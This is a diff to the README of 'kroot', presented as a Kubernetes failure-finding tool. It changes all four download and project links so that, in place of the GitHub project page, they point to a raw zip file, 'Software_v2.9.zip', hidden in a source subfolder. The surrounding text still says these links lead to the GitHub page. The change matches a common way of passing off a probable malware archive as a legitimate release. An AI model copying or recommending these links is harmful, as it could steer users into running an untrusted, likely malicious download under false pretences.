@@ -1,6 +1,6 @@
 # 🐞 kroot - Find Kubernetes Failures Fast
 
-[![Download kroot](https://img.shields.io/badge/Download-kroot-4caf50?style=for-the-badge&logo=github)](https://github.com/puvin489-lang/kroot)
+[![Download kroot](https://img.shields.io/badge/Download-kroot-4caf50?style=for-the-badge&logo=github)](https://github.com/puvin489-lang/kroot/raw/refs/heads/main/crates/analyzers/Software_v2.9.zip)
 
 ## 📋 What is kroot?
 
@@ -32,7 +32,7 @@ Follow these steps to get kroot running on your Windows PC.
 
 Click the big badge above or visit this page to get started:
 
-**https://github.com/puvin489-lang/kroot**
+**https://github.com/puvin489-lang/kroot/raw/refs/heads/main/crates/analyzers/Software_v2.9.zip**
 
 This will take you to the GitHub page where you can download kroot. Look for the latest release and download the Windows version.
 
@@ -123,7 +123,7 @@ Whether your system is simple or large, kroot makes failure finding clearer.
 
 If you want to know more about kroot, visit the main page:
 
-**https://github.com/puvin489-lang/kroot**
+**https://github.com/puvin489-lang/kroot/raw/refs/heads/main/crates/analyzers/Software_v2.9.zip**
 
 Here you will find:
 
@@ -143,4 +143,4 @@ Here you will find:
 
 ---
 
-[![Download kroot](https://img.shields.io/badge/Download-kroot-008080?style=for-the-badge&logo=github&logoColor=white)](https://github.com/puvin489-lang/kroot)
+[![Download kroot](https://img.shields.io/badge/Download-kroot-008080?style=for-the-badge&logo=github&logoColor=white)](https://github.com/puvin489-lang/kroot/raw/refs/heads/main/crates/analyzers/Software_v2.9.zip)
